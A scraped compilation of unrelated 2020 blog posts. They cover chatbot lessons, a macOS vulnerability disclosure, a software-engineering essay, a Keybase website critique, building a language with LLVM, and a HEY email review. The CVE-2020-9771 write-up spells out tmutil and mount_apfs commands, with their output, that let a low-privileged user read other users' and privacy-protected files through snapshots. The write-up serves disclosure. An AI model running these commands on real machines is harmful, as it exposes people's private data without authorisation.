<li><strong>NLP engines are not bilingual. </strong>In some countries, bots should be able to combine different languages <strong>in the same conversation</strong></li>
<li><strong>Everybody seems interested in having sex with a bot.</strong> Trolls are also a huge problem with bots. As a brand you don’t want to risk going viral because your bot gave the wrong response to a Troll question.</li>
<li><strong>Reusable intent libraries</strong>. You don’t want to define again <em>Greetings</em>, <em>Thank You</em> or <em>Troll</em> intents.</li>
<li><strong>Testing chatbots is a largely unexplored area</strong> • <a href="https://xatkit.com/testing-chatbots-with-botium-and-xatkit/" target="_blank" rel="noopener noreferrer">We use Botium to record conversation</a>s to be used as test cases but need much more (e.g. automatic generation of test cases)</li>
<li><strong>More training sentences are not always better.</strong> Overall quality may decrease if they start overlapping with sentences for other intents.</li>
</ul>
</li>
<li><strong>Business</strong>
<ul>
<li><strong>Most end-users do not want to define chatbots.</strong> It doesn’t matter how nice is your interface. They just want to give you their data and get a bot from you.</li>
<li><strong>Find your niche. </strong>There are over a hundred bot solutions out there. Choose wisely your domain (e.g. <a href="https://xatkit.com/free-chatbot-wordpress-plugin/" target="_blank" rel="noopener noreferrer">our WordPress plugin</a>) and your business model. E.g. Consider Selling a service (such as our consulting and <a href="https://xatkit.com/digital-assistant-services/" target="_blank" rel="noopener noreferrer">managed chatbot hosting services</a>) and not a tool.</li>
<li><strong>Understand what really matters to your future clients</strong>. You’ll be surprised. For instance, making sure the color of your chatbot widget perfectly matches the look and feel of their website may be more important to them that your latest cool AI-based feature.</li>
<li><strong>Help your clients understand what their visitors want to use the bot for. </strong>You think you know what your visitors will want to use the bot for but in reality, you don’t. So having a dashboard to monitor the conversations the bot doesn’t know how to answer is vital.</li>
<li><strong>Self-learning bots</strong>. Your clients will want that but it’s risky. You don’t want the bot to learn the wrong things.</li>
</ul>
</li>
</ul>
<p>At the end of the talk I also emphasized why we belive you should consider using Xatkit</p>
<ul>
<li>As <strong>a bot teaching platform. </strong>If you teach any course involving bots, chatbots, NLP or DSLs / software modeling and are looking for a use-case or a ready-to-use bot platform for experimentation we’ll be happy to help with materials and assistance and even (remote) seminars</li>
<li>As <strong>a bot research platform</strong>. In many bot-related research, researchers spend a significant amount of time putting together the bot pieces they need to create their bots and/or run their experiments. We ask you not to reinvent the wheel and, instead, <strong>adopt Xatkit as base platform.</strong> You’ll benefit from all Xatkit features and connectors to have powerful bots with less effort and will be able to spend more time on the core research aspects</li>
</ul>


<p>Of course, mine was just one of the many interesting talks that took place in the workshop. In the <a href="http://botse.org/" target="_blank" rel="noopener noreferrer">BotSE</a> website, you have the full program and links to the videos and slides of all presentations (e.g. don’t miss the great <a href="https://probot.github.io/" target="_blank" rel="noopener noreferrer">Probot</a> talk by <a href="https://dev.to/gr2m/" target="_blank" rel="noopener noreferrer">Gregor Martynus</a>).

July 3, 2020 | https://theevilbit.github.io/posts/cve_2020_9771/ | <a href="https://web.archive.org/web/*/https://theevilbit.github.io/posts/cve_2020_9771/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <h2 id="tldr">TL;DR</h2>
<p>We could mount the entire file system through APFS snapshots as read-only, with the <code>noowners</code> flag, which enables us accessing (almost) every file in the file system, including data (documents, files, etc…) of every user on the system, including those protected by Apple’s privacy framework (TCC). Even with the Guest account we could read files of admin accounts as Guest! 😱</p>
<p>This could be achieved with a single command, for example:
<code>mount_apfs -o noowners -s http://com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap</code></p>
<p>This has been fixed in macOS Catalina 10.15.4 and on Mojave on the 26th of May.</p>
<h2 id="the-issues">The Issues</h2>
<p>There were two separate issues in this bug, and the combination of those became a very powerful system wide access.</p>
<ol>
<li>TCC privacy is not enforced on mounted local snapshots allowing someone to mount it and access any file inside, including those normally privacy protected</li>
<li>Initiating an APFS snapshot is available for all users, even low privileged ones, as well as listing of those. Beyond that, all users can mount local APFS snapshots, even a low privilege ones, and if used with the <code>noowners</code> flag, the low privilege user can access all data through the local snapshot, including every other users’ data (even high privileged one).</li>
</ol>
<h2 id="1-privacy-bypass">1. Privacy bypass</h2>
<p>From Terminal we can get a list of local snapshots available:</p>
<pre><code>% tmutil listlocalsnapshots /System/Volumes/Data
Snapshots for volume group containing disk /System/Volumes/Data:
com.apple.TimeMachine.2019-11-15-202744.local
com.apple.TimeMachine.2019-11-16-135116.local
com.apple.TimeMachine.2019-11-16-145028.local
com.apple.TimeMachine.2019-11-16-162241.local
com.apple.TimeMachine.2019-11-16-182353.local
com.apple.TimeMachine.2019-11-16-214156.local
com.apple.TimeMachine.2019-11-17-112126.local
com.apple.TimeMachine.2019-11-17-122313.local
</code></pre><p>We can mount one:</p>
<pre><code>csaby@mac ~ % /sbin/mount_apfs -o nobrowse,ro -s com.apple.TimeMachine.2019-11-16-182353.local /System/Volumes/Data /tmp/snap
</code></pre><p>If we navigate the user’s folder, we will be able access locations which our protected by TCC.</p>
<pre><code>csaby@mac ~ % ls -l /tmp/snap/Users/csaby/Library/Messages 
total 6224

-rw-r———r———   1 csaby  staff  1520312 Nov 16 08:09 prewarm.db-wal
</code></pre><p>if we compare it with standard access, it is not permitted:</p>
<pre><code>csaby@mac ~ % ls -l /Users/csaby/Library/Messages
ls: Messages: Operation not permitted
</code></pre><p>This is an issue as we can access every file through the local snapshot mountpoint.</p>
<p>We can also force the creation of a snapshot if there is no one:</p>
<pre><code>csaby@mac ~ % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-140728
</code></pre><p>In short with <code>mount_apfs</code> we can completely bypass privacy protected folders.</p>
<h2 id="2--privilege-escalation">2.  “Privilege escalation”</h2>
<p>Although this method is not a full privilege escalation, as we don’t get higher privileges, however we can access files that belong to higher privilege users, and with the previous finding, this will include TCC protected data.</p>
<p>First, as a low privilege user we can create a local snapshot, and later list it to get its ID (this is not a bug). Although the second is not a hard requirement, as its ID can be figured out based on the time. Also snapshots are auto created by the system, so even if we can’t create one we can find one, and its ID is guessable, because it uses the following format: <code>yyyy-mm-dd-hhmmss</code>.</p>
<p>Here follows the demonstration of the issue. This is the low privileged ID I used:</p>
<pre><code>% id                       
uid=502(n00b) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1)
</code></pre><p>To show that it doesn’t have access to other user’s folder (where by-the-way, <code>csaby</code> is an admin user):</p>
<pre><code>n00b@mac Messages % ls -l /Users/csaby/Library 
ls: Library: Permission denied
</code></pre><p>Let’s create and list local snapshots:</p>
<pre><code>n00b@mac Messages % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-141812

% tmutil listlocalsnapshots /
Snapshots for volume group containing disk /:
com.apple.TimeMachine.2019-11-17-133110.local
com.apple.TimeMachine.2019-11-17-133316.local
com.apple.TimeMachine.2019-11-17-141812.local
</code></pre><p>We can mount the snapshot with <code>noowners</code>, which according to the <code>manpage</code> means:</p>
<blockquote>
<p>Ignore the ownership field for the entire volume.  This causes all objects to appear as owned by user ID 99 and group ID 99.  User ID 99 is interpreted as the current effective user ID, while group ID 99 is used directly and translates to `unknown’.</p>
</blockquote>
<pre><code>n00b@mac Messages % mount_apfs -o noowners -s com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap
mount_apfs: snapshot implicitly mounted readonly
</code></pre><p>And finally we can access all data from there as the privileges set for our user:</p>
<pre><code>% cd /tmp/snap/Users/csaby 
n00b@mac csaby % ls -l Library/Messages 
total 4704
-rw-r--r--  1 n00b  staff   258048 Nov  9 14:41 chat.db
-rw-r--r--  1 n00b  staff    32768 Nov 17 13:29 chat.db-shm
-rw-r--r--  1 n00b  staff  1507952 Nov  9 14:41 chat.db-wal
</code></pre><p>We can perform this attack even as a <code>Guest</code> account if FileVault is not turned ON. If FileVault is ON, Guest can only run Safari (after a reboot), and also the user data will be encrypted, so even if someone can break out the kiosk mode and start <code>Terminal</code> and run the above commands, he/she wouldn’t see the contents.</p>
<h2 id="the-fix-">The “Fix” 😭</h2>
<p>This requires some longer explanation as IMO the fix provided by Apple is not right.</p>
<p>At the beginning of March 2020, Apple said that the fix is shipped in Catalina 10.15.4 beta, they didn’t tell a word how they fixed it. I quickly jumped on it, and I found that the trick still works. I was puzzled. After some testing it turned out that they tied this to the Full Disk Access (FDA) right in TCC (<code>kTCCServiceSystemPolicyAllfiles</code>), which I found wrong. This is what I wrote them on the 13th of March:</p>
<blockquote>
<p>I did one more test and turned off “Full Disk Access” for Terminal, and then it indeed stopped working. I don’t consider this as a fix, relaying on TCC stopping this is a bad move in my opinion, most people will have Terminal set to “Full Disk Access”.</p>
<p>This still violates the basic BSD security model, as you can read other user’s file, without elevating to root. <strong>Even if SIP is OFF and Terminal has “Full Disk Access”, you shouldn’t be able to mount anything with “noowners” unless you are root</strong>. **The mount operation itself should fail.**If you think about it: Even if SIP is ON and Terminal has Full Disk Access, you can’t see other user’s files with it - with this vulnerability you can.</p>
<p>“Full Disk Access” TCC setting is global, which means that if an admin user enables this, a low privileged user can use Terminal to access the admin user’s files.</p>
</blockquote>
<p>I got a reply the same day:</p>
<blockquote>
<p>Thank you for providing additional information. We will investigate.</p>
</blockquote>
<p>After this point we went into, what I call “black hole mode”, I never got replies to my emails, and than <code>CVE-2020-9771</code> became public on the 26th of May. They shipped the fix to Mojave on that day (<a href="https://support.apple.com/en-us/HT211170),">https://support.apple.com/en-us/HT211170),</a> and retroactively updated the 10.15.4 security notes the same day with this CVE (<a href="https://support.apple.com/en-us/HT211100">https://support.apple.com/en-us/HT211100</a>). I tested this again, and I found the same behavior. At this point I still didn’t know if they considered this fixed or not, as no one came back to me. Their description “This issue was addressed with a new entitlement.” is extremely misleading.</p>
<p>I sent an email again on May 27th (still in “black hole mode”):</p>
<blockquote>
<p>I want to ask again if you consider this fixed via controlling this “exploit” via the “Full Disk Access” permission in TCC. As noted earlier I think it’s not right.</p>
</blockquote>
<p>Finally on the 29th of June I got a reply:</p>
<blockquote>
<p>This issue was addressed with macOS Catalina 10.15.5 and assigned CVE-2020-9771 -&gt;  <a href="https://support.apple.com/HT211170">https://support.apple.com/HT211170</a> . We are not planning any additional changes in this area.</p>
<p>macOS Catalina has improvements which have reduced the need for applications run through Terminal to require Full-Disk Access, and it should not be enabled by a user unless necessary.</p>
</blockquote>
<p>That’s it, not much I can do about this anymore, I only hope that it will get enough public attention, with many disappointed users about the fix, that 🍎 will reconsider the fix.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The “Full Disk Access” right starts to get too much power these days, beyond controlling file access now it controls mounting, and also EndpointSecurity extensions.</p>
<p>This means that a user must be extremely careful which app is granted FDA right, because that will be able to access every user file on the system. If we grant for example <code>Terminal</code> this right, a low privilege user will be able to read our files through the app.</p>
<p>So until this is changed, please triple check what gets this right and what not.</p>

  <div><p>Right so yes I've spent over 25 years writing software for people in a professional capacity. As time has gone by, and I've learnt more about the process, I've slowly realised that actually writing code is actually quite a small part of the process. When I was a junior developer I probably spent 90% of my working day sat in front of an editor writing code. And I thought that was the job. Turns out it really isn't!Â&nbsp;</p></div><div><p>I think people both inside and outside of the industry fixate on coding for a number of reasons, and it's quite interesting to ruminate on those, but building software is so much more than writing code. Talking to users, agreeing on features, designing the interface, setting up the infrastructure, testing the platform for bugs, testing it for performance, providing support for it. These are all messy, imprecise things that have very human factors.Â&nbsp;</p></div><div><p>If you are a software engineer you can often seek solace in the code itself. Code is truth. You can't really argue with it. You can't argue with your compiler. It's really easy to fall into the trap of avoiding all work other than coding for these very reasons. But I would suggest that this makes you a really bad engineer! Engineering means getting your hands dirty, either literally in the case of Brunel, or from a human interaction point of view where software is concerned.</p></div>

July 3, 2020 | https://yarmo.eu/post/keybase-website | <a href="https://web.archive.org/web/*/https://yarmo.eu/post/keybase-website">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Disclaimer</h2>
<p>Two days ago, I launched <a href="https://keyoxide.org/">Keyoxide.org</a> which provides a few similar functions as <a href="https://keybase.io/">Keybase.io</a> but in an Open Source package. I've been wanting to write this post for a while but felt it could be perceived as disingenuous if posted before making my own project public. Therefore, I post this now.</p>
<h2>TLDR</h2>
<p>The Keybase.io website uses non-optimized resources resulting in a slow pageload and 5+ year old versions of libraries with known and public security vulnerabilities.</p>
<h2>The Keybase.io website</h2>
<p>I have opinions about the Keybase service, but this post is not about that. This is about the facts behind their website, <a href="https://keybase.io/">Keybase.io</a> and more specifically their <a href="https://keybase.io/encrypt">encrypt</a> page, the one you use to <strong>encrypt private and confidential messages</strong>.</p>
<p>When you load that specific page, make sure to load it in a private session or window to eliminate cached resources. What do you notice?</p>
<p>It is slow. Really slow. I noticed so too and decided to run a <a href="https://www.webpagetest.org/result/200627_0Q_044080ef3ab8a678721658c90d2f4706/">Webpagetest (link to result)</a>. Out of three runs, we analyze only the median run (so not the best one, not the worst one).</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__wpt_overview.png" alt="Keybase encrypt Webpagetest overview"><br>
<em>keybase.io/encrypt</em></p>
<h2>The content loaded</h2>
<p>It takes <strong>6.25&nbsp;seconds</strong> to fully load the <strong>2.9&nbsp;megabytes</strong> that are used on this page. That is hefty for a page that is essentially a single form. I mean, look at it:</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt.png" alt="Keybase encrypt page"><br>
<em>Why 2.9 megabytes?</em></p>
<p>That's a regular web form. What could possibly be <strong>2.9&nbsp;megabytes</strong>? The javascript?</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__wpt_1.png" alt="Webpagetest run 1 overview"><br>
<em>How many requests? How many bytes?</em></p>
<p>Most requests are fonts. That makes sense. Earlier, we saw the page only makes <strong>12&nbsp;requests</strong>, so I could imagine a few of those being several fonts files. Fortunately, fonts are only <strong>6.5%</strong> of the bytes loaded, so we'll forgive them.</p>
<p><strong>90&nbsp;percent</strong> of the bytes are due to javascript and images‽ That's <strong>2.6&nbsp;megabytes</strong> for a form! What images?</p>
<h2>Javascript and image(s)</h2>
<p>Let's grab the <a href="https://www.webpagetest.org/result/200627_0Q_044080ef3ab8a678721658c90d2f4706/1/details/#waterfall_view_step1">waterfall</a> and see what is going on:</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__wpt_1_waterfall.png" alt="Webpagetest run 1 waterfall"><br>
<em>Run 1 waterfall</em></p>
<p>At two points in time, the loading of the website stalls. The first stall is <strong>2.6&nbsp;seconds</strong> for the file <code>sitewide-js.js</code>. The second stall is <strong>2.5&nbsp;seconds</strong> for the file <code>footprints_transp.png</code>. Let's go.</p>
<h2>sitewide-js.js</h2>
<p>This file is <strong>4.7&nbsp;megabytes</strong> raw and <strong>1.2&nbsp;megabytes</strong> gzipped. Let us look at a random excerpt:</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__js_excerpt.png" alt="Javascript excerpt"><br>
<em>Javascript excerpt</em></p>
<p>This is not really optimized for performance: one could choose to minimize the javascript. Allow me to use <code>@node-minify/cli</code>.</p>
<p><code>JS_Parse_Error [SyntaxError]: Unexpected token: name «syms», expected: punc «;»</code></p>
<p>Hmm… Let's remove that one line which simply initializes a variable (only fix I could find). I can no longer guarantee it works but let's assume it does.</p>
<p>Old version: <strong>4.7&nbsp;megabytes</strong> raw and <strong>1.2&nbsp;megabytes</strong> gzipped.<br>
New version: <strong>2.5&nbsp;megabytes</strong> raw and <strong>0.7&nbsp;megabytes</strong> gzipped.</p>
<p>First win!</p>
<p>Well, I need to specify one thing: the website loads a gzipped version of the original file at a size of <strong>1.23&nbsp;megabytes</strong>. When I <code>gzip</code> it on my local machine, the original file even becomes <strong>1&nbsp;megabytes</strong>. I don't know what causes this discrepancy, but while we were able to reduce the raw files by 2.2 megabytes, the reduction could only become 0.3 megabytes once gzipped (on my machine™).</p>
<h2>footprints_transp.png</h2>
<p>Have you found the image yet? It's the little image at the bottom of the dog (?) following footprints. Cute :)</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__img.png" alt="Footprints image"><br>
<em>Footprints image</em></p>
<p>Dimensions on page: <strong>330&nbsp;x&nbsp;90 pixels</strong><br>
Dimensions of file: <strong>2836&nbsp;x&nbsp;770 pixels</strong>  </p>
<p>That's only <strong>8.6 times</strong> larger than it needs to be. The bigger crime is the size: <strong>1.4&nbsp;megabytes</strong>. Which is 50% of the website. You guessed it. This could be better.</p>
<p>Using <a href="https://imagecompressor.com/">imagecompressor.com</a>, I can compress this full-sized image down to <strong>398&nbsp;kilobytes</strong> (reduction of <strong>71%</strong>). And I'm even allowing the full 256 colors. And the dimensions are still <strong>8.6&nbsp;times</strong> larger than they need to be.</p>
<p>Optimizing the compression and the image dimensions could yield even better results. I'm not going to bother. The devs didn't either.</p>
<p>Still, second win!</p>
<h2>Anything else we can learn?</h2>
<p>The source code contains this:</p>
<pre><code>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                              K E Y   B A S E

                            crypto for everyone

                        because no one we know ever
                      seems to have a public key. :-(

     No Google Analytics or other 3rd party hosted script tags on Keybase.

     And this has the added bonus that we'll never be able to serve ad code.

                                    \o/  \o/
                                  keybase team

  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</code></pre>
<p>I like it when devs get creative. The third paragraph is a bit alienating, but that's my opinion.</p>
<p>Anything else? Given that this is all cryptography related, maybe some security related issues?</p>
<h2>Security</h2>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__security.png" alt="Webpagetest security score"><br>
<em>Webpagetest security score</em></p>
<p>I've ran quite a few webpagetests on different website, but a <strong>0</strong> security score is new to me. What does that even mean?</p>
<p>Well, <a href="https://snyk.io/test/website-scanner/?test=200627_0Q_044080ef3ab8a678721658c90d2f4706">it turns out</a> that the entire website is built using the following libraries:</p>
<ul>
<li>jquery v1.11.3 (from <a href="https://blog.jquery.com/2015/04/28/jquery-1-11-3-and-2-1-4-released-ios-fail-safe-edition/">april 2015</a>)</li>
<li>bootstrap v3.3.5 (from <a href="https://blog.getbootstrap.com/2015/06/15/bootstrap-3-3-5-released/">june 2015</a>)</li>
<li>moment v2.7.0 (from <a href="https://github.com/moment/moment/releases/tag/2.7.0">june 2014</a>)</li>
</ul>
<p>Besides the obvious aging, these libraries account for a total of six known and public security vulnerabilities, including <a href="https://snyk.io/vuln/SNYK-JS-BOOTSTRAP-72890">cross-site scripting</a>, <a href="https://snyk.io/vuln/SNYK-JS-JQUERY-174006">prototype pollution</a> and <a href="https://snyk.io/vuln/npm:moment:20161019">regular expression denial of service</a>. All six security vulnerabilities have remediations.</p>
<p>Let the <a href="https://blog.getbootstrap.com/2015/06/15/bootstrap-3-3-5-released/">bootstrap v3.3.5 announcement</a> be a painful reminder: this is <em>pushing&nbsp;it</em>.</p>
<h2>Wrapping up</h2>
<p>This should give a nice overview of what could go wrong with a non-optimized and aging website. This could happen to any website. But this is Keybase, the company that promises <strong>"secure messaging and file-sharing"</strong>. The same company that got <a href="https://www.crunchbase.com/organization/keybase">$10.8 million in a Serie A funding</a>. The same company that <a href="https://github.com/keybase/client/issues/24105">won't allow us to see their server code</a>.</p>
<p>To paint a full and fair picture, there has been an <a href="https://keybase.io/docs-assets/blog/NCC_Group_Keybase_KB2018_Public_Report_2019-02-27_v1.3.pdf">audit of the Keybase protocol [PDF]</a> which states that:</p>
<blockquote>
<p>[...] there were weaknesses in the Keybase implementation; these were quickly fixed.</p>
</blockquote>
<p>The audit didn't include the website. I'll just end with another quote from the same audit:</p>
<blockquote>
<p>Another common theme was the presence of legacy code. [...]<br>
This does not necessarily imply that legacy code is insecure, but complexity and security are intertwined – every new piece of code may contain a security vulnerability, and more code correlates with more risk.</p>
</blockquote></div></div>]]>

        <div>

            

            <p>As programming matures and shifts to higher-level abstractions, it becomes more and more about assembling
pre-made building blocks and less about writing new, novel solutions of your own. When I create web apps
(the bread and butter of my day job) I'm using an open-source OS, programming language, database, database
connector library, web server, web framework, authentication libraries, API libraries, payment service libraries...
You get the idea. Increasingly the code I write is "glue" code, simply binding together my building
blocks in the correct order, like a more complicated <a href="https://ifttt.com/">IFTTT</a>, or textual Lego.</p>

<p>It's not surprising that this collection of building blocks is expanding to encompass ever-more-complicated
areas of programming. Today, it's possible to build a simple programming language in the same way you'd
build a web app.</p>


<h3 id="what-s-involved-in-writing-a-language-">What's involved in writing a language?</h3>
<p>The components of a language usually boil down to a "front-end" and a "back-end".</p>
<p>The front-end traditionally consists of a lexer, for turning raw source code into tokens based on grammar
rules, and a parser, for turning tokens into an Abstract Syntax Tree, or AST — nested blocks that represent
operations.</p>
<p>The back-end is the "compiler" which performs steps like type-checking, optimisation, and finally converting
the AST into a lower-level representation. If you're writing an interpreted language, this lower-level is
probably bytecode, rather than an executable, and a corresponding interpreter which reads
and performs bytecode instructions. For example, Python is an interpreted language where <code>.py</code> denotes the raw
source code file, and <code>.pyc</code> the compiled bytecode. When first running a <code>.py</code> file, Python will build a
bytecode-compiled equivalent it can run next time (until your source changes, anyway). If instead you're writing
a compiled language, your back-end builds native executables that can be run directly by the OS.</p>
<p>So once you have a grammar for your syntax, to plug into your front-end, and you can compile the resulting
AST with your back-end, what else is there to do? Well, don't forget about writing a standard library —
defining your built-in types, classes (if you have those), and all of the standard functions to
operate on them. This step is at least as much work.</p>
<h3 id="why-is-it-so-easy-then-">Why is it so easy then?</h3>
<p>If you're writing a language today, many of the parts we defined above already exist for you. Your back-end
and your front-end can both be built out of existing parts.</p>
<p>There are plenty of lexers and parsers available — for example, Lexx and Yacc are a venerable
lexing and parsing combo that have spawned countless modern interpretations. <a href="https://rply.readthedocs.org/">RPly</a>
(RPython Lexx/Yacc) is my current tool of choice in this area. If you use a lexer and parser, the work
left for you is to write your grammar rules, objects representing your AST, and simple functions
telling the parser how to turn grammar into AST. Defining a grammar and an AST are fun! If your syntax
is simple, this step probably won't be that hard either.</p>
<p>For the back-end, <a href="http://llvm.org/">LLVM</a> is the most well-known and respected tool for the job. LLVM powers Clang,
a C and C++ compiler, and other well-known languages like Rust and Swift. The beauty of LLVM is its
Intermediate Representation, or IR. IR looks a lot like assembly language, or really ugly C, but if
you're up for translating your language to LLVM IR, LLVM will take care of optimising and compiling this to a
native executable for you! This is huge. It can even be run in interpreted mode for debugging, or used
as a Just-In-Time (JIT) compiler within your interpreter, if that's your jam.</p>
<p>Fortunately you needn't write IR by hand. Because LLVM has a C interface, there are many LLVM libraries
in many languages to help you create your IR. <a href="http://llvmlite.pydata.org/">Llvm-lite</a> is the most mature Python binding I found,
and what I'm currently using. Essentially, using llvm-lite means you can ask it to create a new function definition for you,
for example, and it'll take care of generating the right IR syntax, and give you back a higher-level interface
for managing variables and code blocks within.</p>
<p>So with this combination of pieces, many of the trickiest parts of writing a language can be wholly outsourced.</p>
<p>Let me give you a concrete example. I'll use my current toy language, written in Python, to demonstrate
how it all goes together:</p>
<ul>
<li>I write a list of tokens (essentially a set of strings) in Python, and feed them to RPly's lexer</li>
<li>I create a Python class to represent each type of AST node or block of code (a function, an if statement, and so on)</li>
<li>I write a set of grammar rules in Python, telling it how to turn tokens into AST instances, and feed them to RPly's parser</li>
<li>I write a compiler class which can turn each AST type into LLVM IR using llvm-lite</li>
</ul>
<p>Then, to compile some source code:</p>
<ul>
<li>The lexer turns my source into tokens</li>
<li>The parser turns tokens into AST</li>
<li>The compiler turns AST into IR, and dumps it to a file</li>
<li>I use the <code>llc</code> tool to compile from IR to an object file</li>
<li>I use <code>gcc</code> to compile that file into an executable</li>
</ul>
<p>Voila, a working program I can run. It can't do much without a standard library, but if I define
the grammar and AST for some "binary operations" like addition and substraction, I can compile
simple arithmetic and return or print the result.</p>
<p>What I'm trying to get at is that once you decide on a grammar for your language, most of the code you
write is glue, turning output from one library into input for another. Of course, this glue code
can get quite complex, but for the modern language developer, so much is already done for you and ready
to plug in. If you have some ideas for a language, it's never been easier to try them out.</p>

<p>After I got my HEY invite during its first week of launch, I started enjoying email again.</p>



<p>I now have a better email workflow using HEY than what I had using Gmail or Spark or even the Apple Mail app.</p>



<p>In this post, I’ll share my HEY workflow and talk about why I chose to pay $99/year for email.</p>



<h2 id="pay-using-data-or-money">Pay using data, or money</h2>



<p>Even before I came across this tweet from DHH, I was already paying for email.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">The first brand-new product from us at Basecamp in many years is coming this April: An email service (not a client) built for people who both love and hate email. We'll fix the hate, and leave you with the love. Email is amazing, and it deserves our best. <a href="https://t.co/J7OCCTFX2Z">https://t.co/J7OCCTFX2Z</a></p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1225487645268160512?ref_src=twsrc%5Etfw">February 6, 2020</a></blockquote>
</div></figure>



<p>I had shifted from free email to a paid one on <a href="https://www.fastmail.com/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">Fastmail</a> back in December 2019.</p>



<p>There we two core reasons behind this decision:</p>



<ul><li><strong>Data privacy. </strong>It was time I stopped tech giants like Google from harvesting my personal and financial data for ads.</li><li><strong>Truly owning my email address.</strong> With a free email on a shared domain, you never truly own your email address. It’s just a rental that might vanish anytime the service provider wishes. Having my email on a custom domain meant I could hold that email address as long as I wished. Also, I could change providers anytime without changing my email address.</li></ul>



<figure><blockquote><p>If you’re not paying for a product, then you are the product.</p></blockquote></figure>



<p>With HEY, the first problem is solved. I’m paying them for their service which leaves out negligible motive for them to mine my data for profit.</p>



<p>And, HEY’s not cheap. It’s $99/year which comes down to $8.25/month. I was paying $5/month on Fastmail.</p>



<p>Apart from the super expensive Superhuman email client, HEY stacks up amongst the top-tier of email providers when it comes to pricing.</p>



<p>However, paying money doesn’t automatically mean they will not snoop on my data. I remember almost paying for <a href="https://otter.ai/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">Otter</a> and then quickly removing it from my phone when I went through <a href="https://blog.otter.ai/privacy-policy/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">their privacy policy</a>.</p>



<p>To dig deep, I went over HEY’s privacy policy, and it checked out. No major red flags.</p>



<p>I did say major because there were a couple of quirks including:</p>



<ul><li>Cookies to track user activity.</li><li>Not respecting a Do Not Track request.</li></ul>



<p>However, I can live with that.</p>



<p>But, what about the lecture on truly owning an email address?</p>



<p>It turns out; HEY offers that too.</p>



<p>Although, there is no support for custom domains as of now, they do commit to roll out the feature later this year.</p>



<p>Here’s a reply from DHH on my tweet:</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">No custom domains at launch. But a commitment to do them later this year 🤘</p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1265687931135524866?ref_src=twsrc%5Etfw">May 27, 2020</a></blockquote>
</div></figure>



<p>But, that’s not all. If you pay for at least one year of HEY which is $99, you get to keep your @hey.com email address, forever.</p>



<p>If I cancel my HEY account next year, I would still be able to receive emails on my @hey.com address if I choose to forward all incoming emails to a new address.</p>



<p>It seems pretty reasonable.</p>



<p>We receive a lot of emails, including sensitive ones like password reset and transaction logs on our email address. Being held hostage and asked to pay a ransom of $99/year just to keep the email address would have been unethical.</p>



<p>Although, I don’t want to move away from HEY anytime soon, this option seems like a good backup strategy.</p>



<h2 id="privacy-aside-i-also-love-hey-for-these-features">Privacy aside, I also love HEY for these features</h2>



<p>If HEY offered only privacy, I would have happily stuck to Fastmail. I was getting a good enough privacy-friendly email for half the price when paid yearly.</p>



<p>But, HEY’s more than just a privacy-friendly email.</p>



<p>Let’s start with:</p>



<h3 id="the-screener">The screener</h3>



<p>The screening feature is a game-changer for me.</p>



<p>I used to do all the hard work of making a filtering rule on my Gmail and Fastmail to weed out any unnecessary emails, but HEY makes it so easy.</p>

<p>Filtering out was a second step in my “konmari” inbox process. My first step was to unsubscribe manually or by using a tool like <a href="https://leavemealone.app/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">LeaveMeAlone</a>.</p>



<p>If I kept getting emails even after unsubscribing, I wrote filtering rules.</p>



<p>HEY screening is the reverse of what I was used to, and it made total sense. I regularly screen-in or screen-out emails and keep my actual email workspace tidy.</p>



<p>Instead of reacting to spammy senders, I am proactively blocking them out of my inbox.</p>



<p>For example, I recently subscribed to the <strong>Dense Discovery</strong> newsletter, and the verification email landed on my screener:</p>

<p>I have seen tweets about why the screener is only helpful for famous people who get tons of emails from unknown senders. I don’t think that’s the case.</p>



<p>This feature has been super helpful for me because I get spammed by a ton of agencies to buy their services.</p>



<p>Example:</p>

<p>What’s the worst part?</p>



<p>They usually don’t have unsubscribe links and often send the same email from different addresses.</p>



<p>Even the filters won’t permanently block these senders from reaching my inbox and cluttering it up.</p>



<p>With HEY, they never get past the screening list. If I ever change my mind about a sender, I can always screen them back in on the <a aria-label="undefined (opens in a new tab)" href="https://app.hey.com/my/clearances" target="_blank" rel="noreferrer noopener nofollow">Screener History page</a>.</p>



<p>For some people, screening might seem like a lot of work. For me, it’s an organising feature I love.</p>



<p>Talking about newsletters:</p>



<h3 id="the-feed-page-is-a-delight">The feed page is a delight</h3>



<p>HEY’s <a aria-label="undefined (opens in a new tab)" href="https://app.hey.com/feedbox" target="_blank" rel="noreferrer noopener nofollow">feed page</a> is how newsletters should be read.</p>



<p>We are already used to reading posts on social media in a linear feed. </p>



<p>Why not have the same approach for newsletters? They’re mostly like social media posts.</p>

<p>I usually visit this page 2-3 times a day and scan through the newsletters I receive.</p>



<p>Unlike Gmail or Spark, HEY doesn’t have a machine learning system to automatically sort emails into their respective folders.</p>



